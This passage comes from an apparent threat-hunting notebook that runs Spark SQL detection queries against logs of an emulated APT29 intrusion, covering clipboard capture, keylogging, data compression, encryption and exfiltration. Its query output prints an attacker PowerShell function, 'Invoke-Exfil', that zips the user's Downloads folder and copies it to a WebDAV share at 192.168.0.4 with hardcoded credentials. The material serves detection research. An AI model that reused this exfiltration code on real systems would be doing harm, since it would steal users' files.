<span class="sd">AND LOWER(f.Payload) LIKE &quot;%get-clipboard%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | CommandInvocation(Get-Clipboard): &quot;Get-Clipboard&quot;


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.18362.628
        Host ID = b802b425-c255-486e-81a2-6d10f7563af8
        Host Application = powershell.exe
        Engine Version = 5.1.18362.628
        Runspace ID = f703f141-62e0-4a88-967c-42505edb0ce4
        Pipeline ID = 21
        Command Name = Get-Clipboard
        Command Type = Cmdlet
        Script Name = 
        Command Path = 
        Sequence Number = 62
        User = DMEVALS\pbeesly
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:

 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:6EC8D7EB-153B-459A-9333-51208449DB99</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ProcessId = c.NewProcessId</span>
<span class="sd">  WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">AND f.EventID = 4103</span>
<span class="sd">AND LOWER(f.Payload) LIKE &quot;%get-clipboard%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | CommandInvocation(Get-Clipboard): &quot;Get-Clipboard&quot;


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.18362.628
        Host ID = b802b425-c255-486e-81a2-6d10f7563af8
        Host Application = powershell.exe
        Engine Version = 5.1.18362.628
        Runspace ID = f703f141-62e0-4a88-967c-42505edb0ce4
        Pipeline ID = 21
        Command Name = Get-Clipboard
        Command Type = Cmdlet
        Script Name = 
        Command Path = 
        Sequence Number = 62
        User = DMEVALS\pbeesly
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:

 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-3-input-capture">
<h2>7.A.3. Input Capture<a class="headerlink" href="#a-3-input-capture" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Captured user keystrokes using the GetAsyncKeyState API</p>
<p><strong>Criteria:</strong> powershell.exe executing the GetAsyncKeyState API</p>
<div class="section" id="id48">
<h3>Detection Type:None(None)<a class="headerlink" href="#id48" title="Permalink to this headline">¶</a></h3>
</div>
</div>
<div class="section" id="b-1-data-from-local-system">
<h2>7.B.1. Data from Local System<a class="headerlink" href="#b-1-data-from-local-system" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Read data in the user’s Downloads directory using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe reading files in C:\Users\pam\Downloads\</p>
<div class="section" id="id49">
<h3>Detection Type:None(None)<a class="headerlink" href="#id49" title="Permalink to this headline">¶</a></h3>
</div>
</div>
<div class="section" id="b-2-data-compressed">
<h2>7.B.2. Data Compressed<a class="headerlink" href="#b-2-data-compressed" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Compressed data from the user’s Downloads directory into a ZIP file (OfficeSupplies.7z) using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe creating the file OfficeSupplies.7z</p>
<div class="section" id="id50">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id50" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:BA68938F-7506-4E20-BC06-0B44B535A0B1</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ProcessGuid, d.ParentProcessGuid</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">  WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 1</span>
<span class="sd">    AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ProcessGuid = e.ProcessGuid</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND f.EventID = 11</span>
<span class="sd">  AND LOWER(f.TargetFilename) LIKE &#39;%officesupplies%&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File created:
RuleName: -
UtcTime: 2020-05-02 03:08:35.270
ProcessGuid: {47ab858c-e374-5eac-d803-000000000400}
ProcessId: 3852
Image: C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\pbeesly\AppData\Roaming\OfficeSupplies.7z
CreationUtcTime: 2020-05-02 03:08:35.270 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-3-data-encrypted">
<h2>7.B.3. Data Encrypted<a class="headerlink" href="#b-3-data-encrypted" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Encrypted data from the user’s Downloads directory using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing Compress-7Zip with the password argument used for encryption</p>
<div class="section" id="id51">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id51" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:4C19DDB9-9763-4D1C-9B9D-788ECF193778</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT f.ScriptBlockText</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ProcessId, d.ParentProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">  WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 1</span>
<span class="sd">    AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">    AND f.EventID = 4104</span>
<span class="sd">    AND LOWER(f.ScriptBlockText) LIKE &quot;%compress-7zip%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | @{
GUID = &#39;bd4390dc-a8ad-4bce-8d69-f53ccf8e4163&#39;
Author = &#39;Thomas Freudenberg&#39;
Description = &#39;Powershell module for creating and extracting 7-Zip archives&#39;
CompanyName = &#39;N/A&#39;
Copyright = &#39;2013-2020 Thomas Freudenberg&#39;
DotNetFrameworkVersion = &#39;4.6.1&#39;
ModuleVersion = &#39;1.10.0.0&#39;
PowerShellVersion = &#39;2.0&#39;
PrivateData = @{
    PSData = @{
        Tags = @(&#39;powershell&#39;, &#39;7zip&#39;, &#39;7-zip&#39;, &#39;zip&#39;, &#39;archive&#39;, &#39;extract&#39;, &#39;compress&#39;, &#39;PSEdition_Desktop&#39;, &#39;Windows&#39;)
        LicenseUri = &#39;https://github.com/thoemmi/7Zip4Powershell/blob/master/LICENSE&#39;
        ProjectUri = &#39;https://github.com/thoemmi/7Zip4Powershell&#39;
        IconUri = &#39;https://raw.githubusercontent.com/thoemmi/7Zip4Powershell/master/Assets/7zip4powershell.png&#39;
        RequireLicenseAcceptance = $false
        # ReleaseNotes = &#39;&#39;
    } # End of PSData hashtable
}

NestedModules = @(&quot;7Zip4PowerShell.dll&quot;)
CmdletsToExport = @(
    &quot;Expand-7Zip&quot;,
    &quot;Compress-7Zip&quot;,
    &quot;Get-7Zip&quot;,
    &quot;Get-7ZipInformation&quot;)
}
                                                                                                                                                                                                                                                
-RECORD 1----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | @{
GUID = &#39;bd4390dc-a8ad-4bce-8d69-f53ccf8e4163&#39;
Author = &#39;Thomas Freudenberg&#39;
Description = &#39;Powershell module for creating and extracting 7-Zip archives&#39;
CompanyName = &#39;N/A&#39;
Copyright = &#39;2013-2020 Thomas Freudenberg&#39;
DotNetFrameworkVersion = &#39;4.6.1&#39;
ModuleVersion = &#39;1.10.0.0&#39;
PowerShellVersion = &#39;2.0&#39;
PrivateData = @{
    PSData = @{
        Tags = @(&#39;powershell&#39;, &#39;7zip&#39;, &#39;7-zip&#39;, &#39;zip&#39;, &#39;archive&#39;, &#39;extract&#39;, &#39;compress&#39;, &#39;PSEdition_Desktop&#39;, &#39;Windows&#39;)
        LicenseUri = &#39;https://github.com/thoemmi/7Zip4Powershell/blob/master/LICENSE&#39;
        ProjectUri = &#39;https://github.com/thoemmi/7Zip4Powershell&#39;
        IconUri = &#39;https://raw.githubusercontent.com/thoemmi/7Zip4Powershell/master/Assets/7zip4powershell.png&#39;
        RequireLicenseAcceptance = $false
        # ReleaseNotes = &#39;&#39;
    } # End of PSData hashtable
}

NestedModules = @(&quot;7Zip4PowerShell.dll&quot;)
CmdletsToExport = @(
    &quot;Expand-7Zip&quot;,
    &quot;Compress-7Zip&quot;,
    &quot;Get-7Zip&quot;,
    &quot;Get-7ZipInformation&quot;)
}
                                                                                                                                                                                                                                                
-RECORD 2----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | function Invoke-Exfil {

    if (!(Get-Module -Name &quot;7Zip4Powershell&quot;)) { Write-Host &quot;[*] Installing 7Zip4Powershell module&quot;; Install-Module -Name 7Zip4Powershell -Force }

    Write-Host &quot;[*] Compressing all the things in download dir&quot;
    Compress-7Zip -Path &quot;$env:USERPROFILE\Downloads\&quot; -Filter * -Password &quot;lolol&quot; -ArchiveFileName &quot;$env:APPDATA\OfficeSupplies.7z&quot;

    $UserName = &quot;cozy&quot;
    $Password = &quot;MyCozyPassw0rd!&quot; | ConvertTo-SecureString -AsPlainText -Force
    $Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $Password

    $WebDavShare = &quot;WebDavShare&quot;
    $uri = &quot;\\192.168.0.4\webdav&quot;

    Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue # Ensure another PSDrive is not occupying the name WebDavShare
    
    Write-Host &quot;[*] Creating a temporary mapped network drive - WebDavShare&quot;
    New-PSDrive -Name $WebDavShare -PSProvider FileSystem -Root $uri -Credential $Creds

    Write-Host &quot;[*] Copying data to WebDavShare&quot;
    Copy-Item &quot;$env:APPDATA\OfficeSupplies.7z&quot; &quot;WebDavShare:\OfficeSupplies.7z&quot; -Force

    Write-Host &quot;[*] Removing temporary network share&quot;
    Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue

    Invoke-BeachCleanup
} 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:C670DAFF-B1FD-45B2-9DEB-AC5AEC273EE7</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT f.ScriptBlockText</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ProcessId = c.NewProcessId</span>
<span class="sd">  WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">AND f.EventID = 4104</span>
<span class="sd">AND LOWER(f.ScriptBlockText) LIKE &quot;%compress-7zip%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | @{
GUID = &#39;bd4390dc-a8ad-4bce-8d69-f53ccf8e4163&#39;
Author = &#39;Thomas Freudenberg&#39;
Description = &#39;Powershell module for creating and extracting 7-Zip archives&#39;
CompanyName = &#39;N/A&#39;
Copyright = &#39;2013-2020 Thomas Freudenberg&#39;
DotNetFrameworkVersion = &#39;4.6.1&#39;
ModuleVersion = &#39;1.10.0.0&#39;
PowerShellVersion = &#39;2.0&#39;
PrivateData = @{
    PSData = @{
        Tags = @(&#39;powershell&#39;, &#39;7zip&#39;, &#39;7-zip&#39;, &#39;zip&#39;, &#39;archive&#39;, &#39;extract&#39;, &#39;compress&#39;, &#39;PSEdition_Desktop&#39;, &#39;Windows&#39;)
        LicenseUri = &#39;https://github.com/thoemmi/7Zip4Powershell/blob/master/LICENSE&#39;
        ProjectUri = &#39;https://github.com/thoemmi/7Zip4Powershell&#39;
        IconUri = &#39;https://raw.githubusercontent.com/thoemmi/7Zip4Powershell/master/Assets/7zip4powershell.png&#39;
        RequireLicenseAcceptance = $false
        # ReleaseNotes = &#39;&#39;
    } # End of PSData hashtable
}

NestedModules = @(&quot;7Zip4PowerShell.dll&quot;)
CmdletsToExport = @(
    &quot;Expand-7Zip&quot;,
    &quot;Compress-7Zip&quot;,
    &quot;Get-7Zip&quot;,
    &quot;Get-7ZipInformation&quot;)
}
                                                                                                                                                                                                                                                
-RECORD 1----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | @{
GUID = &#39;bd4390dc-a8ad-4bce-8d69-f53ccf8e4163&#39;
Author = &#39;Thomas Freudenberg&#39;
Description = &#39;Powershell module for creating and extracting 7-Zip archives&#39;
CompanyName = &#39;N/A&#39;
Copyright = &#39;2013-2020 Thomas Freudenberg&#39;
DotNetFrameworkVersion = &#39;4.6.1&#39;
ModuleVersion = &#39;1.10.0.0&#39;
PowerShellVersion = &#39;2.0&#39;
PrivateData = @{
    PSData = @{
        Tags = @(&#39;powershell&#39;, &#39;7zip&#39;, &#39;7-zip&#39;, &#39;zip&#39;, &#39;archive&#39;, &#39;extract&#39;, &#39;compress&#39;, &#39;PSEdition_Desktop&#39;, &#39;Windows&#39;)
        LicenseUri = &#39;https://github.com/thoemmi/7Zip4Powershell/blob/master/LICENSE&#39;
        ProjectUri = &#39;https://github.com/thoemmi/7Zip4Powershell&#39;
        IconUri = &#39;https://raw.githubusercontent.com/thoemmi/7Zip4Powershell/master/Assets/7zip4powershell.png&#39;
        RequireLicenseAcceptance = $false
        # ReleaseNotes = &#39;&#39;
    } # End of PSData hashtable
}

NestedModules = @(&quot;7Zip4PowerShell.dll&quot;)
CmdletsToExport = @(
    &quot;Expand-7Zip&quot;,
    &quot;Compress-7Zip&quot;,
    &quot;Get-7Zip&quot;,
    &quot;Get-7ZipInformation&quot;)
}
                                                                                                                                                                                                                                                
-RECORD 2----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | function Invoke-Exfil {

    if (!(Get-Module -Name &quot;7Zip4Powershell&quot;)) { Write-Host &quot;[*] Installing 7Zip4Powershell module&quot;; Install-Module -Name 7Zip4Powershell -Force }

    Write-Host &quot;[*] Compressing all the things in download dir&quot;
    Compress-7Zip -Path &quot;$env:USERPROFILE\Downloads\&quot; -Filter * -Password &quot;lolol&quot; -ArchiveFileName &quot;$env:APPDATA\OfficeSupplies.7z&quot;

    $UserName = &quot;cozy&quot;
    $Password = &quot;MyCozyPassw0rd!&quot; | ConvertTo-SecureString -AsPlainText -Force
    $Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $Password

    $WebDavShare = &quot;WebDavShare&quot;
    $uri = &quot;\\192.168.0.4\webdav&quot;

    Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue # Ensure another PSDrive is not occupying the name WebDavShare
    
    Write-Host &quot;[*] Creating a temporary mapped network drive - WebDavShare&quot;
    New-PSDrive -Name $WebDavShare -PSProvider FileSystem -Root $uri -Credential $Creds

    Write-Host &quot;[*] Copying data to WebDavShare&quot;
    Copy-Item &quot;$env:APPDATA\OfficeSupplies.7z&quot; &quot;WebDavShare:\OfficeSupplies.7z&quot; -Force

    Write-Host &quot;[*] Removing temporary network share&quot;
    Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue

    Invoke-BeachCleanup
} 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-4-exfiltration-over-alternative-protocol">
<h2>7.B.4. Exfiltration Over Alternative Protocol<a class="headerlink" href="#b-4-exfiltration-over-alternative-protocol" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Exfiltrated collection (OfficeSupplies.7z) to WebDAV network share using PowerShell</p>
<p><strong>Criteria:</strong> powershell executing Copy-Item pointing to an attack-controlled WebDav network share (192.168.0.4:80)</p>
<div class="section" id="id52">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id52" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:7AAC6658-2B5C-4B4A-B7C9-D42D288D5218</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT f.ScriptBlockText</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessId, d.ParentProcessId</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%copy-item%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
